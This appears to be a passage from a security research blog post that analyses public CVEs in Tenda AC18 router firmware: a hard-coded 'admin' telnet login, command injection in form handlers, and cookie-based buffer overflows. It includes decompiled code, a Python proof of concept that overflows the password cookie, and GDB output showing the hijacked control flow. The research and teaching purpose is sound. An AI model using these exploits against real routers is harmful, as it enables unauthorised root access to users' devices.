+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LDR             R3, =(aTelnet - 0xE4560) ; &quot;telnet&quot;</span><br><span class="line">ADD             R3, R4, R3 ; &quot;telnet&quot;</span><br><span class="line">MOV             R0, R3</span><br><span class="line">LDR             R3, =(TendaTelnet_ptr - 0xE4560)</span><br><span class="line">LDR             R3, [R4,R3] ; TendaTelnet</span><br><span class="line">MOV             R1, R3</span><br><span class="line">BL              sub_16AB4</span><br></pre></td></tr></table></figure>
+
+<p>Go deep inside the <code>TendaTelnet</code> function, it will kill the existed one and relaunch a new telnet service. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall TendaTelnet(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v3[32]; // [sp+10h] [bp-12Ch] BYREF</span><br><span class="line">  char s[268]; // [sp+30h] [bp-10Ch] BYREF</span><br><span class="line"></span><br><span class="line">  memset(s, 0, 0x100u);</span><br><span class="line">  memset(v3, 0, sizeof(v3));</span><br><span class="line">  GetValue(&quot;lan.ip&quot;, v3);</span><br><span class="line">  system(&quot;killall -9 telnetd&quot;);</span><br><span class="line">  doSystemCmd(&quot;telnetd -b %s &amp;&quot;, v3);</span><br><span class="line">  sprintf(s, &quot;op=%d,wl_rate=%d,index=1&quot;, 14, 24);</span><br><span class="line">  send_msg_to_netctrl(19, s);</span><br><span class="line">  sub_2BCF0(a1, &quot;load telnetd success.&quot;);</span><br><span class="line">  return sub_2C238(a1, 200);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>In <code>R7WebsSecurityHandler</code>, we then have the code that handles parsing requests. Which only needs a simple password <code>admin</code> (after base-64 decode) to log in. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/telnet&quot;</span>, <span class="number">0xE</span>u) </span><br><span class="line">|| g_Pass[<span class="number">0</span>] &amp;&amp; <span class="built_in">strcmp</span>(g_Pass, <span class="string">&quot;YWRtaW4=&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>Therefore, we are able to successfully login to the telnet service of the router and gain root privileges</p>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="CVE-2018-16334"><a href="#CVE-2018-16334" class="headerlink" title="CVE-2018-16334"></a>CVE-2018-16334</h3><p>Similar to <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2020-10987">CVE-2020-10987</a>, this function can definitely execute the command as the attacker wish once they get the username and password in the router. </p>
+<p>After some search, this vulnerability was also assigned a CVE number <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2018-16334/">CVE-2018-16334</a>. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">formWriteFacMac</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user_input; <span class="comment">// [sp+14h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  user_input = (<span class="type">const</span> <span class="type">char</span> *)get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;mac&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;00:01:02:11:22:33&quot;</span>);</span><br><span class="line">  sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;modify mac only.&quot;</span>);</span><br><span class="line">  doSystemCmd(<span class="string">&quot;cfm mac %s&quot;</span>, user_input);</span><br><span class="line">  <span class="keyword">return</span> sub_2C238(a1, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>From the pseudo-code above we can clearly see the logic that it takes the user input and then concatenate it to the command. We can construct payload as below. </p>
+<p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/WriteFacMac_payload.png" data-caption="WriteFacMac_payload"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/WriteFacMac_payload.png" alt="WriteFacMac_payload"></a></p>
+<p>In the qemu-system emulation, we have:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: asjdfo: not found</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2020-15916"><a href="#CVE-2020-15916" class="headerlink" title="CVE-2020-15916"></a>CVE-2020-15916</h3><p>This function is mentioned in <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2020-15916/">CVE-2020-15916</a>, which directly receives parameters from <code>lan.ip</code> and injects it into the command line argument. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">TendaTelnet</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">32</span>]; <span class="comment">// [sp+10h] [bp-12Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">268</span>]; <span class="comment">// [sp+30h] [bp-10Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  GetValue(<span class="string">&quot;lan.ip&quot;</span>, v3);</span><br><span class="line">  system(<span class="string">&quot;killall -9 telnetd&quot;</span>);</span><br><span class="line">  doSystemCmd(<span class="string">&quot;telnetd -b %s &amp;&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;op=%d,wl_rate=%d,index=1&quot;</span>, <span class="number">14</span>, <span class="number">24</span>);</span><br><span class="line">  send_msg_to_netctrl(<span class="number">19</span>, s);</span><br><span class="line">  sub_2BCF0(a1, <span class="string">&quot;load telnetd success.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_2C238(a1, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2022-28557"><a href="#CVE-2022-28557" class="headerlink" title="CVE-2022-28557"></a>CVE-2022-28557</h3><p>Similar to <a href="#cve-2018-16334">CVE-2018-16334</a>, we can also exploit <code>formSetSambaConf</code> function to achieve command execution. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">formSetSambaConf</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+10h] [bp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [sp+50h] [bp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// [sp+54h] [bp-28h]</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// [sp+58h] [bp-24h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [sp+5Ch] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [sp+60h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// [sp+64h] [bp-18h]</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// [sp+68h] [bp-14h]</span></span><br><span class="line">  <span class="type">void</span> *user_input; <span class="comment">// [sp+6Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  user_input = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;password&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">  v11 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;premitEn&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  v10 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;internetPort&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;21&quot;</span>);</span><br><span class="line">  s1 = (<span class="type">char</span> *)get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;action&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;usbName&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  v7 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;guestpwd&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  v6 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;guestuser&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  v5 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;guestaccess&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;del&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    doSystemCmd(<span class="string">&quot;/usr/sbin/usb umount %s&quot;</span>, v8);</span><br><span class="line">    sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>);</span><br><span class="line">    sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;&#123;\&quot;errCode\&quot;:0&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> sub_2C238(a1, <span class="number">200</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    GetValue(<span class="string">&quot;usb.samba.guest.user&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] )</span><br><span class="line">      doSystemCmd(<span class="string">&quot;busybox deluser %s&quot;</span>, s);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.samba.pwd&quot;</span>, user_input);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.samba.guest.user&quot;</span>, v6);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.samba.guest.pwd&quot;</span>, v7);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.samba.guest.acess&quot;</span>, v5);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.pwd&quot;</span>, user_input);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.guest.user&quot;</span>, v6);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.guest.pwd&quot;</span>, v7);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.guest.acess&quot;</span>, v5);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.remote.acess&quot;</span>, v11);</span><br><span class="line">    SetValue(<span class="string">&quot;usb.ftp.remote.port&quot;</span>, v10);</span><br><span class="line">    GetValue(<span class="string">&quot;usb.samba.enable&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">      doSystemCmd(<span class="string">&quot;cfm post netctrl %d?op=%d&quot;</span>, <span class="number">42</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      doSystemCmd(<span class="string">&quot;cfm post netctrl %d?op=%d&quot;</span>, <span class="number">42</span>, <span class="number">2</span>);</span><br><span class="line">    GetValue(<span class="string">&quot;usb.ftp.enable&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">      v2 = doSystemCmd(<span class="string">&quot;cfm post netctrl %d?op=%d&quot;</span>, <span class="number">43</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v2 = doSystemCmd(<span class="string">&quot;cfm post netctrl %d?op=%d&quot;</span>, <span class="number">43</span>, <span class="number">2</span>);</span><br><span class="line">    CommitCfm(v2);</span><br><span class="line">    sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>);</span><br><span class="line">    sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;&#123;\&quot;errCode\&quot;:0&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> sub_2C238(a1, <span class="number">200</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Here is the payload:</p>
+<p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetSambaCfg_payload.png" data-caption="SetSambaCfg_payload"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetSambaCfg_payload.png" alt="SetSambaCfg_payload"></a></p>
+<p>qemu-system emulation respond with:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: asdf: not found</span><br></pre></td></tr></table></figure>
+
+<h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><h3 id="CVE-2018-5767"><a href="#CVE-2018-5767" class="headerlink" title="CVE-2018-5767"></a>CVE-2018-5767</h3><p>Reference from <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2018-5767/">CVE-2018-5767</a>, there is an unchecked <code>sscanf</code> read in the request package’s cookie section which happened in <code>R7WebsSecurityHandler</code> function. </p>
+<p>To reach the vulnerable section, we must pass a bunch of checks:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(url, <span class="string">&quot;/public/&quot;</span>, <span class="number">8u</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/lang/&quot;</span>, <span class="number">6u</span>)</span><br><span class="line">  &amp;&amp; !<span class="built_in">strstr</span>(url, <span class="string">&quot;img/main-logo.png&quot;</span>)</span><br><span class="line">  &amp;&amp; !<span class="built_in">strstr</span>(url, <span class="string">&quot;reasy-ui-1.0.3.js&quot;</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/favicon.ico&quot;</span>, <span class="number">0xC</span>u)</span><br><span class="line">  &amp;&amp; *(_DWORD *)(a1 + <span class="number">152</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/kns-query&quot;</span>, <span class="number">0xA</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/wdinfo.php&quot;</span>, <span class="number">0xB</span>u)</span><br><span class="line">  &amp;&amp; (<span class="built_in">strlen</span>(url) != <span class="number">1</span> || *url != <span class="number">47</span>)</span><br><span class="line">  &amp;&amp; (<span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/telnet&quot;</span>, <span class="number">0xE</span>u) || g_Pass[<span class="number">0</span>] &amp;&amp; <span class="built_in">strcmp</span>(g_Pass, <span class="string">&quot;YWRtaW4=&quot;</span>))<span class="comment">// </span></span><br><span class="line">                                              <span class="comment">// CVE-2018-5770 Unauthenticated Start of Telnetd </span></span><br><span class="line">                                              <span class="comment">// CVE-2018-5768 Hard Coded Accounts</span></span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/fast_setting&quot;</span>, <span class="number">0x14</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/ate&quot;</span>, <span class="number">0xB</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/InsertWhite&quot;</span>, <span class="number">0x13</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/yun_safe.html&quot;</span>, <span class="number">0xE</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/getWanConnectStatus&quot;</span>, <span class="number">0x1B</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/getProduct&quot;</span>, <span class="number">0x12</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/goform/getRebootStatus&quot;</span>, <span class="number">0x17</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(url, <span class="string">&quot;/redirect.html&quot;</span>, <span class="number">0xE</span>u)</span><br><span class="line">  &amp;&amp; (i &lt;= <span class="number">2</span> || <span class="built_in">strncmp</span>(url, <span class="string">&quot;/loginerr.html&quot;</span>, <span class="number">0xE</span>u)) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// other code</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(url, <span class="string">&quot;/index.html&quot;</span>, <span class="number">0xB</span>u) &amp;&amp; GetValue(<span class="string">&quot;ali.reset.cfg&quot;</span>, nptr) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(nptr, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">      sub_2B730(a1, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(s, url, <span class="number">0xFF</span>u);</span><br><span class="line">  v42 = <span class="built_in">strchr</span>(s, <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">    *v42 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// !! vulnerable !!</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">184</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v44 = <span class="built_in">strstr</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">184</span>), <span class="string">&quot;password=&quot;</span>);<span class="comment">// sscanf read from request&#x27;s without any limit</span></span><br><span class="line">    <span class="keyword">if</span> ( v44 )</span><br><span class="line">      <span class="built_in">sscanf</span>(v44, <span class="string">&quot;%*[^=]=%[^;];*&quot;</span>, v34);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">sscanf</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">184</span>), <span class="string">&quot;%*[^=]=%[^;];*&quot;</span>, v34);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>This shows that <code>url</code> cannot be empty, or equal to <code>\</code>, or have a length equal to 1, or equal to any other strings shown in the big <code>strcmp</code> section. </p>
+<p>After entering the if section, <code>url</code> also cannot be <code>inde.html</code>.</p>
+<p>Finally enter the if the section that <code>sscanf</code> reads the user input, if we construct the payload properly, it can cause buffer overflow. </p>
+<p>Here is a simple POC:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.10.1&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://%s/goform/execCommand&quot;</span> % ip</span><br><span class="line">cookies = &#123;<span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;password=&quot;</span> + <span class="string">&quot;A&quot;</span> * <span class="number">456</span> + <span class="string">&quot;BBBB&quot;</span>&#125;</span><br><span class="line">ret = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(ret.text)</span><br></pre></td></tr></table></figure>
+
+<p>GDB view (successfully hijack the control flow to <code>0x42424242</code>):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> R0   0x0</span><br><span class="line">*R1   0xff605268 &lt;- 0</span><br><span class="line"> R2   0x0</span><br><span class="line"> R3   0x0</span><br><span class="line">*R4   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R5   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R6   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R7   0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R8   0xe5d0 &lt;- mov    ip, sp /* 0xe1a0c00d */</span><br><span class="line">*R9   0x2dd04 &lt;- push   &#123;r4, fp, lr&#125; /* 0xe92d4810 */</span><br><span class="line">*R10  0xfffef6b8 &lt;- 0</span><br><span class="line">*R11  0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">*R12  0xff74dedc -&gt; 0xff743a50 &lt;- mov    r3, r0 /* 0xe1a03000 */</span><br><span class="line">*SP   0xfffeec58 -&gt; 0x103f00 &lt;- ldrbvs r0, [r0, r0]! /* 0x67f00000 */</span><br><span class="line">*PC   0x42424242 (&#x27;BBBB&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2022-28556"><a href="#CVE-2022-28556" class="headerlink" title="CVE-2022-28556"></a>CVE-2022-28556</h3><p>This vulnerability happened in the function <code>formSetPPTPServer</code>. It uses <code>sscanf</code> to format the data from the HTTP requests. However, it doesn’t correctly limit the length of the input. </p>
+<p>It first gets the parameter of <code>serverEn, startIp, endIp</code> from the post request. Then, it checks if <code>serverEn = 0</code>, if not, then check if <code>serverEn = 1</code>, if it equals 1, and if both <code>startIp</code> and <code>endIp</code> have data in it, the control flow will reach the vulnerable <code>sscanf</code> part.</p>
+<p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code1.png" data-caption="SetPptpServerCfg_code1"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code1.png" alt="SetPptpServerCfg_code1"></a></p>
+<p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code2.png" data-caption="SetPptpServerCfg_code2"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_code2.png" alt="SetPptpServerCfg_code2"></a></p>
+<p>So the poc is quite simple, satisfied all requirements above and crash the process.</p>
+<p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_poc.png" data-caption="SetPptpServerCfg_poc"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/SetPptpServerCfg_poc.png" alt="SetPptpServerCfg_poc"></a></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.tendacn.com/us/download/detail-3852.html">https://www.tendacn.com/us/download/detail-3852.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68">https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213416">https://www.anquanke.com/post/id/213416</a></p>
+<p><a target="_blank" rel="noopener" href="https://fidusinfosec.com/tenda-ac15-unauthenticated-telnetd-start-cve-2018-5770/">https://fidusinfosec.com/tenda-ac15-unauthenticated-telnetd-start-cve-2018-5770/</a></p>
+<p><a target="_blank" rel="noopener" href="https://nosec.org/home/detail/4634.html">https://nosec.org/home/detail/4634.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204403">https://www.anquanke.com/post/id/204403</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231445">https://www.anquanke.com/post/id/231445</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7357?spm=5176.12901015.0.i12901015.65db525cQBSuI3&amp;accounttraceid=1d7f8f3f083842dba12fa62662c34665asfk#toc-1">https://xz.aliyun.com/t/7357?spm=5176.12901015.0.i12901015.65db525cQBSuI3&amp;accounttraceid=1d7f8f3f083842dba12fa62662c34665asfk#toc-1</a></p>
+<p><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2021/05/28/QEMU-networking/">https://wzt.ac.cn/2021/05/28/QEMU-networking/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
